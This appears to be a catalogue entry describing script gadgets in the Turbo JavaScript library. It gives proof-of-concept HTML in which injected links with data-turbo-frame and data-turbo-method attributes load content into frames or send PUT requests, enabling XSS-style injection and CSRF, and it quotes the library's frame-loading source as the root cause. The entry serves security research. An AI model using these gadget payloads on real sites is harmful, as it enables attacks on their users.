---
description: The speed of a single-page web application without having to write any JavaScript.
github: hotwired/turbo
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - a-tag
      - href-attr
      - data-attr
      - any-timing
    pocs:
      - description: |
          The [turbo](https://github.com/hotwired/turbo) library uses the `data-turbo-frame` attribute to specify an iframe to load the response into. For this to work there is several restrictions:

          * The `<a>`'s `href` attribute must be same origin with the current window ([source](https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/observers/link_prefetch_observer.js#L154)).
          * The target URL must not have an `unvisitableExtensions` like: `.7z`, `.aac`... The full list can be found here: [https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/core/config/drive.js](https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/core/config/drive.js).
          * The response Content-Type must be considered as HTML by the following regex: `/^(?:text\/([^\s;,]+\b)?html|application\/xhtml\+xml)\b/` ([source](https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/http/fetch_response.js#L32)).
        code: |
          <script type="module" src="https://cdn.jsdelivr.net/npm/@hotwired/turbo-rails@8.0.16/app/assets/javascripts/turbo.min.js"></script>
          <turbo-frame id="frame">
          
          <turbo-frame id="message">
            <p>This content will be replaced.</p>
          </turbo-frame>
          
          <!-- user input -->
          <a href="[current-location]/assets/xss/turbo-frame.html" data-turbo-frame="message">Load Message</a>
      - description: |
          While the above example is very limited by the Content-Type restriction, it is possible to uses default [turbo](https://github.com/hotwired/turbo) `data-*` attribute to perform CSRF. For instance, the `data-turbo-method` attribute can be used to change the HTTP method of the request.

          *The full list of available attributes can be found [here](https://turbo.hotwired.dev/reference/attributes).*
        code: |
          <script type="module" src="https://cdn.jsdelivr.net/npm/@hotwired/turbo-rails@8.0.16/app/assets/javascripts/turbo.min.js"></script>
          <turbo-frame id="frame">
          
          <turbo-frame id="message">
            <p>This content will be replaced.</p>
          </turbo-frame>
          
          <!-- user input -->
          <a data-turbo-method="PUT" href="[current-location]/" data-turbo-frame="message">Load Message</a>
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/core/frames/frame_controller.js#L122">https://github.com/hotwired/turbo/blob/71a769167eb64fafed48fe45ed175a54738216af/src/core/frames/frame_controller.js#L122</a>

      ```javascript
      async loadResponse(fetchResponse) {
        if (fetchResponse.redirected || (fetchResponse.succeeded && fetchResponse.isHTML)) {
          this.sourceURL = fetchResponse.response.url
        }

        try {
          const html = await fetchResponse.responseHTML
          if (html) {
            const document = parseHTMLDocument(html)
            const pageSnapshot = PageSnapshot.fromDocument(document)

            if (pageSnapshot.isVisitable) {
              await this.#loadFrameResponse(fetchResponse, document)
            } else {
              await this.#handleUnvisitableFrameResponse(fetchResponse)
            }
          }
        } finally {
          this.#shouldMorphFrame = false
          this.fetchResponseLoaded = () => Promise.resolve()
        }
      }
      ```
---
